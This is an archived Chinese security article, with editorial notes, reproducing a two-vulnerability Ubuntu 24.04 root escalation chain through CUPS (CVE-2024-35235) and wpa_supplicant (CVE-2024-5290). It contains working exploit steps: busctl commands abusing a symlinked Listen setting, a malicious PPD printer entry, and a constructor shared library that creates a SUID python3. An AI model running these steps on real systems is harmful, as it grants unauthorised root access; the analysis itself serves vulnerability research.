---
source: "gelusus/wxvl 公众号漏洞文库"
cve: "CVE-2024-35235;CVE-2024-5290"
identifier_role: "primary"
primary_identifiers: "CVE-2024-35235;CVE-2024-5290"
referenced_identifiers: "CVE-2023-29360;CVE-2024-3446"
identifier_status: "unknown"
title: "Ubuntu24.04 提权漏洞实例分析"
product: "CUPS + wpa_supplicant (Ubuntu配置)"
record_type: "roundup"
document_type: "双漏洞链深入复现"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "Ubuntu24.04本地可调用CupsPkHelper配置接口，AppArmor路径限制、netdev D-Bus策略/服务组；22.04特定包对照失败"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Linux/Ubuntu24.04%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-5823c23416ad9f076244913b"
entity_id: "ve-5823c23416ad9f076244913b"
schema_version: "1"
---

# Ubuntu24.04 提权漏洞实例分析

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：CUPS + wpa_supplicant (Ubuntu配置)
- 文献类型：双漏洞链深入复现
- 版本、权限及部署边界：Ubuntu24.04本地可调用CupsPkHelper配置接口，AppArmor路径限制、netdev D-Bus策略/服务组；22.04特定包对照失败
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. frontmatter缺两个主CVE；非Linux内核漏洞，主实体应CUPS和wpa_supplicant，保留利用链关联
2. 35235速览引用wpa的Launchpad链接为错配，文末有正确CUPS GHSA需重新指向
3. 详细保留22.04与24.04服务配置差异及失败尝试，很有价值，不能只按同CVE与简稿删重
4. 开始CUPS D-Bus ServerSetSettings权限/polkit会话条件未充分列，假设普通用户任意调用需补；root阶段只为分组件测试，不能当独立LPE证据
5. 缺精确CUPS/wpa包修复版本与完整PPD/编译步骤；关键图证未查看；代码块嵌套三引号/命令无空格需恢复
6. Group netdev不是用户netdev，叙述混称应纠正；保留上游/Snyk/Ubuntu来源和恢复配置提示

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/。文章作者通过利用两个漏洞（CVE-2024-35235和>
- 原文参考链接（未重新核验）：<https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613，这是一个存在于CUPS（Common>
- 原文参考链接（未重新核验）：<https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613，该漏洞允许攻击者在运行wpa_supplicant时加载任意共享对象文件（shared>
- 原文参考链接（未重新核验）：<https://ubuntu.com/security/CVE-2024-35235>
- 原文参考链接（未重新核验）：<https://ubuntu.com/security/CVE-2024-5290>
- 原文参考链接（未重新核验）：<http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

原创 戴勤明  华为安全应急响应中心   2025-02-20 10:10  
  
**1**  
  
**前言**  
  
  
  
笔者一直关注与操作系统本地提权相关的漏洞研究。在过去的一段时间里，大部分此类漏洞已有现成的利用代码，复现的过程主要集中于搭建环境并验证漏洞利用的有效性。然而，近日在搜索关键词“Linux local privilege escalation”并将时间范围限定为过去一年时，偶然发现了一篇有趣的文章  
https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/。文章作者通过利用两个漏洞（CVE-2024-35235和 CVE-2024-5290）在Ubuntu 24.04 LTS上完成了本地提权。  
  
这篇文章详细讲述了作者发现这两个漏洞的过程，并展示了如何利用它们实现本地提权。尤其值得一提的是，作者还绘制了一张直观的流程图来展示漏洞利用的完整步骤。然而，文章中并未提供具体的漏洞利用代码。进一步查阅这两个漏洞的信息后，仅能找到一些社区公告与补丁信息等零散资料。  
  
基于上述文章，本文对相关漏洞和其利用原理进行了深入的学习研究，并整理成文，供学习探讨。  
  
  
  
**2**  
  
**速览**  
  
  
  
**CVE-2024-35235是什么？**  
  
CVE-2024-35235是一个在利用链中被首先触发的漏洞。根据社区公告  
https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613，这是一个存在于CUPS（Common UNIX Printing System）中的安全漏洞。当使用指向符号链接的  
Listen配置项启动  
cupsd服务器时，由于对符号链接文件解析的不当处理，攻击者可以通过创建特定的符号链接文件，使CUPS（以root权限运行的进程）将任意文件的权限更改为777，从而使文件对所有用户可写。  
  
可能听起来有些难以理解，我们通过以下代码来分析问题：  
  
```
    // Remove any existing domain socket file...
    unlink(addr->un.sun_path);   
    // Save the current umask and set it to 0 so that all users can access
    // the domain socket...
    mask = umask(0);    
    
    // Bind the domain socket...
    status = bind(fd, (struct sockaddr *)addr, (socklen_t)httpAddrLength(addr));    
    
    // Restore the umask and fix permissions...
    umask(mask);
    chmod(addr->un.sun_path, 0140777);
```  
  
  
在这段代码中，  
addr->un.sun_path是一个用户可控的路径。攻击者可以将其设置为指向特定目标的符号链接文件（后文将详细说明如何设置此路径）。当  
cupsd执行时：  
1. 如果  
unlink操作失败（后文将解释失败原因），程序不会停止，继续执行后续代码。  
  
1. 在  
chmod阶段，权限被设置为777，这将使符号链接所指向的目标文件权限被修改。  
  
  
  
**CVE-2024-5290是什么？**  
  
CVE-2024-5290是利用链中的第二个漏洞，暴露在  
wpa_supplicant软件中。根据社区公告  
https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613，该漏洞允许攻击者在运行wpa_supplicant时加载任意共享对象文件（shared object file，动态链接库）。攻击者  
可以编译一个恶意的动态链接库并通过wpa_s  
upplicant加载该库，从而实现提权。  
  
**它们是什么关系？**  
  
为了利用CVE-2024-5290成功加载恶意链接库，用户必须是**root用户**或者属于**netdev**组。这意味着，利用该漏洞进行提权的前提是攻击者已经具备某种程度的权限，至少需要是netdev组的成员。结合之前提到的第一个漏洞**CVE-2024-35235**，该漏洞通过错误的符号链接处理使得攻击者能够将文件权限修改为777，从而实现对某些文件的写入权限。攻击者可以利用这个漏洞将自己提权到netdev组。接着，攻击者便能够利用CVE-2024-5290漏洞加载恶意的动态链接库，从而实现更高权限的获取。  
  
  
  
**3**  
  
**修补补丁**  
  
  
  
Ubuntu官方已经在2024年提供了修补版本  
  
CVE-2024-35235 ：  
  
https://ubuntu.com/security/CVE-2024-35235  
  
CVE-2024-5290：  
  
https://ubuntu.com/security/CVE-2024-5290    
  
  
  
**4**  
  
**技术分析**  
  
  
  
**Part 1：CVE-2024-35235**  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOqqtuNmB7L4EHr0jFjRyyCu0TDDqtE2SfvmTYvEYJpC4yJPxpqW3fShf1EibJCOOgb5n8PCJm5gYRrIncvep5Cp0/640?wx_fmt=svg&from=appmsg "")  
  
**利用Dbus设置Listen参数**  
  
DBus是一个基于客户端/服务器的远程过程调用(RPC)框架，广泛应用于Linux系统中。它允许不同的进程之间进行通信，提供了一个消息总线，客户端可以通过该总线向服务器请求操作，服务器则提供响应。服务器在DBus总线上注册自己，并定义一组可以被客户端调用的方法。  
  
DBus总线上有很多内置的安全控制机制，用于限制哪些用户或组可以调用特定的服务和方法。通过这些控制，DBus保证了系统的安全性，防止不被授权的进程或用户进行不当的操作。  
  
在原文中，作者关注的服务是  
org.opensuse.CupsPkHelper.Mechanism。这是一个与打印系统（CUPS）相关的服务，提供了一些方法，涉及参数设置，打印机创建等操作。这里可以使用  
busctl introspect命令来查看该服务的详细信息。通过introspect命令，我们可以查看特定服务暴露的方法以及对应的参数类型等信息。如下是该命令的输出：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV14UhpV3lw2Su5xXP87p3y4KkmMPcaaaze9ALdU5XE1zbTdGaxhNxLfQ/640?wx_fmt=png&from=appmsg "")  
  
这里描述了每个接口对应的参数类型。当然，这里使用命令  
gdbus introspect--system--destorg.opensuse.CupsPkHelper.Mechanism--object-path /可以看到更为详细的描述信息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1EyxlW22IdbViaZyXVu4NrFPTQeggnYia8nJVA91wWAxZETpczappSyQQ/640?wx_fmt=png&from=appmsg "")  
  
其中的接口ServerGetSettings，ServerSetSettings分别用来查看以及设置CUPS的运行参数。在每次设置参数（即调用ServerSetSettings）后，CUPS都会进行一次重启以加载新的配置。（在后文中，我们将多次调用该方法。）  
  
我们可以先简单使用busctl调用一下Dbus方法，例如调用ServerGetSettings方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1ECxjFicML0jfOodZajhSYricEN2crkxKVSqYGwia9MQSuNDJUTnq4gWwg/640?wx_fmt=png&from=appmsg "")  
  
这里返回的类型类似于字典，15指代长度，第一个key为  
_debug_logging，value为0。相应的，可以通过ServerSetSettings设置参数，例如，这里的  
IdleExitTimeout已经被修改为了61（原先为60）。实际上，这里的配置信息和文件/etc/cups/cupsd.conf是对应的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1iah8gHaAicjOYmVKiaYTpM5icpQegwibBlIqq167lsTPwFibI5hn3IR91gsQ/640?wx_fmt=png&from=appmsg "")  
  
接下来，我们就要设置Listen参数，将其设置为一个软链接路径。  
  
```
busctl call org.opensuse.CupsPkHelper.Mechanism / org.opensuse.CupsPkHelper.Mechanism ServerSetSettings a{ss} 1 "Listen" "/tmp/stage/passwd"
```  
  
  
该命令通过  
busctl调用org.opensuse.CupsPkHelper.Mechanism服务，设置  
Listen参数为/tmp/stage/passwd，其中/tmp/stage/passwd是一个软链接，指向了系统的关键文件/etc/passwd。使用  
strace来跟踪  
cupsd进程的系统调用，会看到如下结果：  
  
```
unlink("/tmp/stage/passwd")             = -1 EACCES (Permission denied)
umask(000)                              = 022
bind(6<UNIX-STREAM:[125588]>, {sa_family=AF_UNIX, sun_path="/tmp/stage/passwd"}, 20) = -1 EADDRINUSE (Address already in use)
umask(022)                              = 000
chmod("/tmp/stage/passwd", 0140777)     = -1 EACCES (Permission denied)
```  
  
  
这里有两个值得关注的地方：  
  
（1）unlink失败  
  
调用unlink("/tmp/stage/passwd")失败，返回错误  
EACCES(Permission denied)。这个操作尝试删除软链接/tmp/stage/passwd，但是由于AppArmor的限制，cupsd进程无法在/tmp/目录下执行文件删除操作。AppArmor是Linux内核的一个安全模块，提供强制访问控制（MAC），通过为每个应用程序定义访问权限来限制它的操作。这里可以通过文件/etc/apparmor.d/usr.sbin.cupsd来查看cupsd对于不同文件路径的权限，由于其中没有关于路径/tmp的定义，因此，当执行unlink删除  
/tmp/stage/passwd时，操作将被拒绝。  
  
（2）chmod失败  
  
调用  
chmod("/tmp/stage/passwd", 0140777)失败，同样返回了EACCES (Permission denied)错误。这一调用试图将/tmp/stage/passwd的权限更改为777，即对所有用户可读、可写、可执行。与unlink操作类似，chmod失败的根本原因也是AppArmor限制。cupsd无法对  
/etc/passwd文件进行更改。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOqqtuNmB7L4EHr0jFjRyyCu0TDDqtE2SfvmTYvEYJpC4yJPxpqW3fShf1EibJCOOgb5n8PCJm5gYRrIncvep5Cp0/640?wx_fmt=svg&from=appmsg "")  
  
**修改cups的配置文件属性**  
  
尽管在/tmp/目录下无法执行删除和修改操作，但AppArmor允许cupsd进程对/etc/cups目录下的文件进行修改。因此我们将目标改为修改文件  
/etc/cups/cupsd.conf属性：  
  
```
$ ln -s /etc/cups/cupsd.conf /tmp/stage/cupsd.conf
$ busctl call org.opensuse.CupsPkHelper.Mechanism / org.opensuse.CupsPkHelper.Mechanism ServerSetSettings a{ss} 1 "Listen" "/tmp/stage/cupsd.conf"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1hXYaq5scu8B4zJKcqjJuOLMpemKUBmxtFFOVE8G2Bg87ArQesj9iapQ/640?wx_fmt=png&from=appmsg "")  
  
结果成功修改了文件的属性。  
  
接下来，直接修改文件/etc/cups/cupsd.conf，添加Listen项为/etc/cups/cups-files.conf，然后重启cups，从而修改/etc/cups/cups-files.conf文件的属性为全局可写。  
```
$ echo "Listen /tmp/stage/cups-files.conf" | tee -a /etc/cups/cupsd.conf > /dev/null
$ busctl call org.opensuse.CupsPkHelper.Mechanism / org.opensuse.CupsPkHelper.Mechanism ServerSetSettings a{ss} 1 "IdleExitTimeout" "61"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1eYNAs0F807icPvSuxxy8gSycrU1iacG4GjLDbmYdBianmeTKA1fsCWgRw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOqqtuNmB7L4EHr0jFjRyyCu0TDDqtE2SfvmTYvEYJpC4yJPxpqW3fShf1EibJCOOgb5n8PCJm5gYRrIncvep5Cp0/640?wx_fmt=svg&from=appmsg "")  
  
**以任何非root用户权限的方式运行命令**  
  
/etc/cups/cups-files.conf是CUPS配置文件之一，其中包含了设置CUPS在执行外部程序时所使用的用户和组。在该文件中，  
User和  
Group选项指定了CUPS在执行外部命令时所使用的用户名和用户组。如下所示：  
  
```
Group group-name-or-number
        Specifies the group name or ID that will be used when executing external programs.         The default group is operating system specific but is usually "lp" or "nobody".
User username
        Specifies the user name or ID that is used when running external programs. The       default is "lp".
```  
  
  
这里默认在运行时的用户以及组为lp。作者尝试直接将用户设置为  
root，但是发现执行被拦截了，这是由于CUPS中以下的代码片段：  
  
```
      if (!p->pw_uid)
      {
        cupsdLogMessage(CUPSD_LOG_ERROR,                        
                "Will not use User %s (UID=0) as specified on line "
                "%d of %s for security reasons.  You must use a "
                "non-privileged account instead.",
                        value, linenum, CupsFilesFile);        
        if (FatalErrors & CUPSD_FATAL_CONFIG)          
        return (0);
      }
```  
  
  
该段代码的作用是阻止CUPS使用UID为0（即root用户）的配置。  
  
尽管不能直接将用户设置为root，但作者发现仍然可以利用现有的能力以**非root用户**（如  
netdev）的权限执行命令。在CUPS 配置文件中，我们可以插入类似以下的配置行：  
  
```
Group netdev
```  
  
  
这使得CUPS在执行外部命令时将会使用netdev组权限，而不是默认的  
lp或  
nobody。由于netdev组通常是一个较高权限的组，因此攻击者可以利用这一点来提升权限，执行一些需要netdev组权限的操作。  
  
那么我们该如何让CUPS执行命令呢？答案是利用打印机PPD配置文件去执行命令。  
  
在PPD文件中可以插入一行如下的配置，可用于在打印文件时执行命令：  
  
```
*FoomaticRIPCommandLine: CMD
```  
  
  
这里可以通过接口PrinterAddWithPpdFile添加一个打印机：  
  
```
### add evil printer
echo "add evil printer"
busctl call org.opensuse.CupsPkHelper.Mechanism / org.opensuse.CupsPkHelper.Mechanism PrinterAddWithPpdFile sssss  \
   "EvilPrinter" "ipp://192.168.8.116:631" "/tmp/stage/evil.ppd" "Printer" "Local Printer"
```  
  
  
之后进行打印操作，打印的过程将会执行CMD命令。  
  
  
**Part 2：CVE-2024-5290**  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOqqtuNmB7L4EHr0jFjRyyCu0TDDqtE2SfvmTYvEYJpC4yJPxpqW3fShf1EibJCOOgb5n8PCJm5gYRrIncvep5Cp0/640?wx_fmt=svg&from=appmsg "")  
  
**利用Dbus加载动态链接库**  
  
wpa_supplicant是一种在Linux、BSD和 Windows等操作系统中广泛使用的无线网络协议实现工具，用于管理和配置无线网络连接，特别是支持Wi-Fi保护访问（WPA 和WPA2）。它主要用来处理无线网络的身份验证和加密。  
  
wpa_supplicant同样提供了一套Dbus接口方便用户进行管理。使用命令进行查看：  
  
```
gdbus introspect --system --dest fi.w1.wpa_supplicant1 --object-path /fi/w1/wpa_supplicant1
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1Kg4GdEaZ5GjOQY433yMMER23by3icEn4DW60WKcjHW0IWhyCXQptyuw/640?wx_fmt=png&from=appmsg "")  
  
这里我们需要用到的接口是CreateInterface，其参数类型为a{sv}，表示一个字典（数组类型a）的键值对，其中：  
- key是字符串类型(s)。  
  
- 值是可变类型(v)，可以是任意D-Bus支持的类型，例如整数、字符串、布尔值等。  
  
经过一番简单的尝试后，发现可以用这种方式调用这个接口：  
  
```
busctl call     fi.w1.wpa_supplicant1     /fi/w1/wpa_supplicant1     fi.w1.wpa_supplicant1     CreateInterface     "a{sv}"     3     "ConfigFile" "s" "/tmp/wpa.conf"     "Ifname" "s" "lo"     "Driver" "s" "none"
```  
  
  
但是由于权限限制，当普通用户执行该命令时将报错：  
  
```
$ busctl call     fi.w1.wpa_supplicant1     /fi/w1/wpa_supplicant1     fi.w1.wpa_supplicant1     CreateInterface     "a{sv}"     3     "ConfigFile" "s" "/tmp/wpa.conf"     "Ifname" "s" "lo"     "Driver" "s" "none"
Call failed: Access denied
```  
  
  
因此在测试阶段我们可以先用root身份运行这条命令。那么这条命令能干嘛呢？按照原作者的文章可知，通过设置ConfigFile的路径，可以让wpa_supplicant加载指定的动态链接库，从而执行动态链接库中的逻辑。例如：我们可以这样编写ConfigFile配置文件：  
  
```
ctrl_interface=/var/run/wpa_supplicant
update_config=1
opensc_engine_path=/tmp/stage/evil.so
```  
  
  
这样，  
/tmp/stage/evil.so将以root身份进行加载。简单测试一下！  
  
编写一个evil.c：  
  
```
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void init(void) {    
    if(setuid(0) == 0) {
        system("cp /usr/bin/python3 /tmp/stage/getroot");
        system("chmod u+s /tmp/stage/getroot");
    }
}
```  
  
  
然后编译成/tmp/stage/evil.so  
  
以root身份执行Dbus命令：  
  
```
$ sudo busctl call     fi.w1.wpa_supplicant1     /fi/w1/wpa_supplicant1     fi.w1.wpa_supplicant1     CreateInterface     "a{sv}"     3     "ConfigFile" "s" "/tmp/wpa.conf"     "Ifname" "s" "lo"     "Driver" "s" "none"
Call failed: wpa_supplicant couldn't grab this interface.
```  
  
  
尽管会显示执行失败，但此时动态链接库已经被加载了，查看一下是否生成了  
/tmp/stage/getroot：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1jqibfq3wgErrW4TVicAYiaj1JGFn5odiaCicHoBufx1bUbzYjx0bCHibUUQg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOqqtuNmB7L4EHr0jFjRyyCu0TDDqtE2SfvmTYvEYJpC4yJPxpqW3fShf1EibJCOOgb5n8PCJm5gYRrIncvep5Cp0/640?wx_fmt=svg&from=appmsg "")  
  
**以netdev组身份执行Dbus命令**  
  
查看dbus策略文件  
/usr/share/dbus-1/system.d/wpa_supplicant.conf：  
  
```
<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
 <busconfig>
        <policy user="root">
                <allow own="fi.w1.wpa_supplicant1"/>
                <allow send_destination="fi.w1.wpa_supplicant1"/>
                <allow send_interface="fi.w1.wpa_supplicant1"/>
                <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
        </policy>
        <policy group="netdev">
                <allow send_destination="fi.w1.wpa_supplicant1"/>
                <allow send_interface="fi.w1.wpa_supplicant1"/>
                <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
        </policy>
        <policy context="default">
                <deny own="fi.w1.wpa_supplicant1"/>
                <deny send_destination="fi.w1.wpa_supplicant1"/>
                <deny receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
        </policy>
 </busconfig>
```  
  
  
可以发现除了root用户可以调用接口外，用户组netdev也同样可以。但是，真的可以吗？把当前用户添加到组netdev中，然后执行一下命令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1nHNexxel9DbqPeLXdRPSRWWd5DcMazk8IDG46FD5vVHicRDUcFjD3sQ/640?wx_fmt=png&from=appmsg "")  
  
无法执行。  
  
重新去查看一下官方的公告：https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613  
  
发现原来是wpa_supplicant的配置文件的问题，在ubuntu22.04上（2:2.10-6ubuntu2.1 updates），并不存在以下的配置代码更新：  
  
> 原文此处代码块为空，内容未归档；无法从空块证明或复现所述结果。
to allow `netdev` users access to the wpa_supplicant which gets started as a service
```diff
diff --git a/wpa_supplicant/systemd/wpa_supplicant.service.in b/wpa_supplicant/systemd/wpa_supplicant.service.in
index 18cbc11..f02bc15 100644
--- a/wpa_supplicant/systemd/wpa_supplicant.service.in
+++ b/wpa_supplicant/systemd/wpa_supplicant.service.in
@@ -8,8 +8,11 @@ IgnoreOnIsolate=true
 [Service]
 Type=dbus
 BusName=fi.w1.wpa_supplicant1
 -ExecStart=@BINDIR@/wpa_supplicant -u -s -O /run/wpa_supplicant
 +ExecStart=@BINDIR@/wpa_supplicant -u -s -O "DIR=/run/wpa_supplicant GROUP=netdev"
 ExecReload=/bin/kill -HUP $MAINPID
 +Group=netdev
 +RuntimeDirectory=wpa_supplicant
 +RuntimeDirectoryMode=0750

 [Install]
 WantedBy=multi-user.target
```  
  
  
查看本地的文件：  
  
```
$ cat /usr/lib/systemd/system/wpa_supplicant.service
[Unit]
Description=WPA supplicant
Before=network.target
After=dbus.service
Wants=network.target
IgnoreOnIsolate=true

[Service]
Type=dbus
BusName=fi.w1.wpa_supplicant1
ExecStart=/sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
ExecReload=/bin/kill -HUP $MAINPID

[Install]
WantedBy=multi-user.target
Alias=dbus-fi.w1.wpa_supplicant1.service
```  
  
  
并没有关键的配置："DIR=/run/wpa_supplicant GROUP=netdev"  
  
因此，在ubuntu22.04上，wpa_supplicant服务并没有使用netdev组调用接口CreateInterface，导致该漏洞无法利用。  
  
为此，下载了Ubuntu24.04 LTS，查看一下本地的配置文件：  
  
```
$ cat /usr/lib/systemd/system/wpa_supplicant.service
[Unit]
Description=WPA supplicant
Before=network.target
After=dbus.service
Wants=network.target
IgnoreOnIsolate=true

[Service]
Type=dbus
BusName=fi.w1.wpa_supplicant1
ExecStart=/usr/sbin/wpa_supplicant -u -s -O "DIR=/run/wpa_supplicant GROUP=netdev"
ExecReload=/bin/kill -HUP $MAINPID
Group=netdev
RuntimeDirectory=wpa_supplicant
RuntimeDirectoryMode=0750

[Install]
WantedBy=multi-user.target
Alias=dbus-fi.w1.wpa_supplicant1.service
```  
  
  
果然，在ubuntu24.04上是支持使用以netdev组的身份进行调用的。测试一下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1GM3Yj4oyj7o68gG8KHu2cO7jdmoswA7ruMW9JWUvmQluwV3ibQ565Eg/640?wx_fmt=png&from=appmsg "")  
  
成功调用。  
  
  
**把它们链起来！**  
  
这里使用原作者制作的利用链流程图，比较直观清晰：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1WO94jqqbMKA3E7SRVnibdMG65vqSavr0PVCSYu5biaaYq6lUlGT1RPKA/640?wx_fmt=png&from=appmsg "")  
  
图片来源：  
https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/  
  
步骤如下：  
1. 创建临时目录/tmp/stage，并创建相关的软链接文件，/tmp/stage/cupsd.conf，/tmp/stage/cups-files.conf（这里同时可以备份一下原先的配置文件）  
  
1. 调用CUPS的Dbus方法ServerSetSettings，修改Listen参数，使其指向/tmp/stage/cupsd.conf。重启完成后，/etc/cups/cupsd.conf将全局可写。  
  
1. 修改/etc/cups/cupsd.conf，插入一行  
Listen /tmp/stage/cups-files.conf，然后调用CUPS的Dbus方法ServerSetSettings，修改IdleExitTimeout参数（无关参数，主要是为了重启CUPS进程）。重启完成后，/etc/cups/cups-files.conf将全局可写。  
  
1. 修改/etc/cups/cups-files.conf，插入一行  
Group netdev，使得后续的外部调用将携带netdev组权限。  
  
1. 为后续的wpa_supplicant的Dbus方法做准备：制作恶意的动态链接库（复制python3到/tmp目录下并修改为SUID程序），并将链接写入文件/tmp/stage/wpa.conf。  
  
1. 调用CUPS的Dbus方法PrinterAddWithPpdFile创建一个打印机，要求指向的ppd文件中插入一行FoomaticRIPCommandLine信息，用于调用wpa_supplicant的Dbus方法。  
  
1. 使用新创建的打印机打印文件，这将触发对wpa_supplicant的Dbus方法的调用。调用结束后，将在/tmp/stage目录下生成一个带有SUID属性的python3程序。  
  
1. 执行创建出来的python3程序，即可获得root权限。  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pf9eicDVDMxGEzDKtVnqYIQfGdNvx3aV1mzJxibqQlg7hFI7vFeKkZhfy6xZGEcqBJQmjs0rcfKTOHEutfCwxmlA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**5**  
  
**参考**  
  
  
  
https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/  
  
https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613  
  
https://github.com/OpenPrinting/cups/security/advisories/GHSA-vvwp-mv6j-hw6f  
  
https://w1.fi/wpa_supplicant/devel/dbus.html  
  
  
  
**以上漏洞，Ubuntu****官方已修复，及时更新可有效降低漏洞风险。**  
  
**本公众号发布、转载的文章所涉及的技术、思路、工具仅供学习交流，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！**  
  
**推荐阅读**  
  
[开工纳福 | 每日福袋限定开启，提交漏洞福气开奖！](https://mp.weixin.qq.com/s?__biz=MzI0MTY5NDQyMw==&mid=2247525477&idx=1&sn=8625f0419bc871098271566762f61337&scene=21#wechat_redirect)  
  
  
[Windows CVE-2023-29360漏洞的研究与分析](https://mp.weixin.qq.com/s?__biz=MzI0MTY5NDQyMw==&mid=2247525402&idx=1&sn=7868570982251b31fc9800aa6e26e17b&scene=21#wechat_redirect)  
  
  
[Qemu重入漏洞梳理 & CVE-2024-3446分析](https://mp.weixin.qq.com/s?__biz=MzI0MTY5NDQyMw==&mid=2247525362&idx=1&sn=c4deb862cf6c20288271d0e0f5720331&scene=21#wechat_redirect)  
  
  
  
点这里![](https://mmbiz.qpic.cn/mmbiz_gif/MfTd6rd9CyvNRMW8I9cvI1CK5gKiaYqg2veTn9t9dAe1GxYic7pAvgvRIKNFickConFyX8AvW2reAq8GchJI6aBpA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
关注我们，一键三连～  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
